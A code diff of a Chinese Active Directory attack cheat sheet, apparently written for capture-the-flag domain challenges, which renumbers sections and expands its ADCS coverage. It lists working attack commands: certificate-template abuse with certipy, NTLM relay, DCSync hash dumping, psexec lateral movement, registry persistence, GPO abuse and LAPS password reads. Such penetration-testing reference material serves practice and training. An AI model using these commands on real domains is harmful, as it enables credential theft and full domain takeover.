@@ -19,7 +19,7 @@ metadata: { domain: ad-win, tier: T1 }
 | 需要枚举域内关系 | §1 枚举: BloodHound / ldapsearch / kerbrute |
 | 有凭据需要横向移动 | 加载 `lateral-movement` |
 | 有 ADCS / CA 但 certipy find 无漏洞 | §8 Certificate Theft |
-| 有 ADCS 漏洞模板 | §8.1-8.10 ADCS ESC1-8 |
+| 有 ADCS 漏洞模板 | §16.1-16.10 ADCS ESC1-13（1-8 为主流） |
 | 有可写 SMB 共享 | §9 强制认证 & NTLM Relay |
 | 发现 RODC / krbtgt_XXXX | §10 RODC 攻击链 |
 | 发现委派关系 | §11 委派攻击 (Unconstrained/Constrained) |
@@ -32,20 +32,7 @@ metadata: { domain: ad-win, tier: T1 }
 
 ## 0. 题型识别（🔴 拿 shell 第一秒）
 
-```
-[ ] 🔴 这是什么 OS？
-    ├─ Windows Server 2025 (Build 26100) → dMSA, VBS, Credential Guard 新特性
-    ├─ Windows Server 2016-2022 → Shadow Credentials, ADCS, RBCD
-    └─ 更早 → 传统攻击
-
-[ ] 🔴 LDAP 搜 KDS Root Key → 存在 → ⚠️ BadSuccessor 题型！
-[ ] 🔴 已控用户有什么权限？
-    ├─ CreateChild on OU + GenericWrite → BetterSuccessor
-    ├─ GenericWrite → Shadow Credentials (首选) or 🆕 RBCD
-    ├─ WriteDacl / WriteOwner → RBCD / 直接改权限
-    └─ 仅 READ → 继续枚举
-[ ] 🔴 有 .vmem / .vmdk / .vhd？→ VMkatz
-```
+题型识别决策树见 ad-type-recognition 卡
 
 ## 1. 初始枚举（🔴 拿到域凭据第一步）
 
@@ -120,7 +107,7 @@ nltest /domain_trusts /all_trusts /v
 SharpSuccessor.exe --target <target_DN> --ou <OU_DN>
 
 # 或手动分步: bloodyAD 创建子计算机 + badS4U2self 模拟
-# SharpSuccessor 一键命令见 checkpoint-toolchain / quickref-cards
+# SharpSuccessor 一键命令见 quickref-cards
 ```
 
 ## 3. 🆕 RBCD + S4U2Self/Proxy（比凭据收集优先！）
@@ -151,6 +138,7 @@ SharpSuccessor.exe --target <target_DN> --ou <OU_DN>
 [4] 🔴 必须用 FQDN 不能用 IP:
     impacket-mssqlclient -k -no-pass '<domain>/<victim>@<FQDN>' -windows-auth
 ```
+（SPN-less 见 rbcd-spnless 卡）
 
 ## 4. 🆕 groupType 跨林技巧
 
@@ -212,6 +200,7 @@ set object <DN> groupType -v="-2147483644"   # Domain Local (0x80000004)
   export KRB5CCNAME=/tmp/user.ccache
   用 ccache 后不要再混用 -u/-p 参数 → 两者冲突
 ```
+（详见 kerberos-only-ad 卡）
 
 ## 8. 🆕 Certificate Theft（certipy find 无漏洞 ≠ ADCS 不能打）
 
@@ -268,6 +257,7 @@ set object <DN> groupType -v="-2147483644"   # Domain Local (0x80000004)
    → 抓到 hash → hashcat -m 5600 hash rockyou.txt
    → 或 relay: ntlmrelayx -t ldap://DC --delegate-access
 ```
+（完整链见 ntlm-relay-chain 卡）
 
 ## 10. 🆕 RODC 攻击链 (krbtgt_XXXX)
 
@@ -294,6 +284,7 @@ set object <DN> groupType -v="-2147483644"   # Domain Local (0x80000004)
 
 🔴 血的教训: RODC ≠ 普通 DC → 常规 DCSync 直接失败
 ```
+（完整链见 rodc-privesc-chain 卡）
 
 ## 11. 🆕 委派攻击
 
@@ -332,6 +323,7 @@ Constrained (S4U2Proxy):
   # 或直接登录:
   nxc smb DC -u 'TEST-SRV$' -p 'test-srv'
 ```
+（详见 pre2k-attack 卡）
 
 ## 13. NoPAC (CVE-2021-42278/42287)
 
@@ -358,16 +350,18 @@ Constrained (S4U2Proxy):
 
 ## 15. Kerberoast / ASREP（🟡 最后一招）
 
-## 8. ADCS 攻击（🔴 现代 AD 题最大攻击面）
+Kerberoast/ASREP 完整流程见 password-attacks 卡
 
-### 8.1 枚举
+## 16. ADCS 攻击（🔴 现代 AD 题最大攻击面）
+
+### 16.1 枚举
 ```
 [ ] certipy find -vulnerable -dc-ip <DC_IP> -u user -p pass
 [ ] certipy find -vulnerable -dc-ip <DC_IP> -k -no-pass -target <DC>
 [ ] 🔴 certipy template 不支持 ccache → bloodyAD set object 直改 LDAP
 ```
 
-### 8.2 ESC1 — 模板允许请求者指定 SAN
+### 16.2 ESC1 — 模板允许请求者指定 SAN
 ```
 条件: ENROLLEE_SUPPLIES_SUBJECT + 允许客户端认证 + 未经理审批
 利用:
@@ -377,14 +371,14 @@ certipy auth -pfx administrator.pfx -dc-ip <DC>
 → 直接拿 Administrator TGT/HT
 ```
 
-### 8.3 ESC2 — Any Purpose / SubCA 模板
+### 16.3 ESC2 — Any Purpose / SubCA 模板
 ```
 条件: 模板 EKU 为 "Any Purpose" (OID 2.5.29.37.0) 或完全无 EKU → 可用于客户端认证
 利用: certipy req -ca <CA> -template <Template> -upn admin@domain.htb
 → 无 EKU 限制 = 证书可用于任何目的（含认证/签名/加密）
 ```
 
-### 8.4 ESC3 — 注册代理（Enrollment Agent）
+### 16.4 ESC3 — 注册代理（Enrollment Agent）
 ```
 条件: 有 Enrollment Agent 模板的注册权 + 目标模板允许授权签名
 利用:
@@ -393,7 +387,7 @@ certipy req -ca <CA> -template <TargetTemplate> -on-behalf-of user \
   -pfx agent.pfx ...                                   # 用代理签目标证书
 ```
 
-### 8.5 ESC4 — 模板 ACL 可写（最灵活）
+### 16.5 ESC4 — 模板 ACL 可写（最灵活）
 ```
 条件: GenericWrite/WriteDacl on 模板对象
 利用:
@@ -404,21 +398,21 @@ certipy template -u user -p pass -dc-ip <DC> -template <T> \
 # 🔴 certipy template 不支持 ccache → bloodyAD set object 直改
 ```
 
-### 8.6 ESC5 — CA 对象 ACL 可写
+### 16.6 ESC5 — CA 对象 ACL 可写
 ```
 条件: WriteDacl/GenericAll on CA 对象（非模板）
 利用: certipy ca -u user -p pass -ca <CA> -enable-template <Template>
 → 启用禁用模板 → 用其他 ESC 路径
 ```
 
-### 8.7 ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 标志
+### 16.7 ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 标志
 ```
 条件: CA 的 FLAG 有 EDITF_ATTRIBUTESUBJECTALTNAME2（旧补丁前默认）
 利用: 同 ESC1，但任意模板只要允许客户端认证，用户可在 CSR 中指定 SAN
 certipy req -ca <CA> -template <AnyAuthTemplate> -upn admin@domain.htb
 ```
 
-### 8.8 ESC7 — ManageCA / ManageCertificates 权限
+### 16.8 ESC7 — ManageCA / ManageCertificates 权限
 ```
 条件: ManageCA → 可修改 CA 设置 → 启用 EDITF_ATTRIBUTE...
 条件: ManageCertificates → 可代发已批准的证书
@@ -431,7 +425,7 @@ ManageCertificates:
 certipy ca -ca <CA> -issue-request <request_id>  # 签发待批准请求
 ```
 
-### 8.9 ESC8 — NTLM Relay → ADCS Web Enrollment
+### 16.9 ESC8 — NTLM Relay → ADCS Web Enrollment
 ```
 前置: CA 有 HTTP Web Enrollment 端点 (http://<CA>/certsrv/)
 利用链:
@@ -445,14 +439,14 @@ certipy ca -ca <CA> -issue-request <request_id>  # 签发待批准请求
 🔴 key: 目标机器的 machine account 有 Template 注册权
 ```
 
-### 8.10 黄金证书（Golden Certificate）
+### 16.10 黄金证书（Golden Certificate）
 ```
 条件: CA 私钥泄露 → 直接签发自己的 CA 证书
 利用: certipy ca -ca <CA> -backup → 导出 CA cert+key
 → 伪造任意证书 → 模拟任何用户
 ```
 
-### 8.11 certipy req → auth 完整链路
+### 16.11 certipy req → auth 完整链路
 ```
 # Step 1: 请求证书
 certipy req -u user -p pass -dc-ip <DC> -ca <CA> \
@@ -465,8 +459,9 @@ certipy auth -pfx admin.pfx -dc-ip <DC>
 # Step 3 (可选): export KRB5CCNAME=admin.ccache → 横向
 impacket-psexec -k -no-pass domain/admin@<TARGET>
 ```
+（完整链见 adcs-attack-chain 卡）
 
-## 9. DCSync
+## 17. DCSync
 ```
 # 条件: Replicating Directory Changes / All 权限 (DA 或有 DCSync right)
 impacket-secretsdump domain/user:pass@<DC>
@@ -475,7 +470,7 @@ impacket-secretsdump -k -no-pass domain/user@<DC>       # Kerberos
 # 拿到 NTDS.dit → 所有域用户的 NT hash → Golden Ticket / PtH
 ```
 
-## 10. 横向 / 持久化
+## 18. 横向 / 持久化
 ```
 # 持久化 — 至少建 2 条独立路径
 
@@ -495,9 +490,22 @@ reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /t R
 impacket-secretsdump -just-dc-user administrator <DC>
 ```
 
-## 11. 🆕 GPO / LAPS / DACL 链式利用
+（详见 dsrm-credentials 卡）
 
-### 11.1 GPO Abuse
+深卡入口：
+- SCCM →（详见 sccm-attacks 卡）
+- DCShadow →（详见 dcshadow 卡）
+- DNSAdmins →（详见 dnsadmins-privesc 卡）
+- AdminSDHolder →（详见 adminsdholder-abuse 卡）
+- Exchange/OWA →（详见 exchange-owa-attacks 卡）
+- 用户名枚举 →（详见 username-generation 卡）
+- PrintNightmare →（详见 printnightmare-printer-leaks 卡）
+- SID History →（详见 sid-history-injection 卡）
+- SCF 文件投放 →（详见 scf-ntlm-theft 卡）
+
+## 19. 🆕 GPO / LAPS / DACL 链式利用
+
+### 19.1 GPO Abuse
 ```
 # 条件: GenericWrite / WriteDacl on GPO 对象
 SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" \
@@ -506,14 +514,15 @@ SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" \
 gpupdate /force
 ```
 
-### 11.2 LAPS 读取
+### 19.2 LAPS 读取
 ```
 # ReadLAPSPassword 权限 → 读本地 Admin 密码
 Get-ADComputer -Identity <COMPUTER> -Properties ms-Mcs-AdmPwd
 netexec ldap <DC_IP> -u user -p pass -M laps
 ```
+（详见 laps-password-extraction 卡）
 
-### 11.3 DACL 链式利用
+### 19.3 DACL 链式利用
 ```
 # WriteDacl → GenericAll → Shadow Credentials → DCSync
 bloodyAD set dacledit <target_DN> -s '<my_SID>' --full
@@ -546,7 +555,7 @@ bloodyAD set password <target_DN> 'NewPass123!'
 | 🔴 0 | 题型识别 | OS + KDS + 权限 + Protected Users? |
 | 🔴 1 | BetterSuccessor | KDS + CreateChild + GenericWrite |
 | 🔴 2 | **RBCD + S4U** | GenericWrite/WriteDacl + 可控账户 |
-| 🔴 3 | ADCS ESC1-8 | certipy find → 模板漏洞 → req+auth |
+| 🔴 3 | ADCS ESC1-13（1-8 为主流） | certipy find → 模板漏洞 → req+auth |
 | 🔴 4 | Shadow Credentials | GenericWrite + KDC 有 CA |
 | 🔴 5 | **Certificate Theft** | 机器账户有证书 → 直接导出 |
 | 🔴 6 | **Kerberos-Only 范式** | NTLM 全失败 → -k -no-pass |
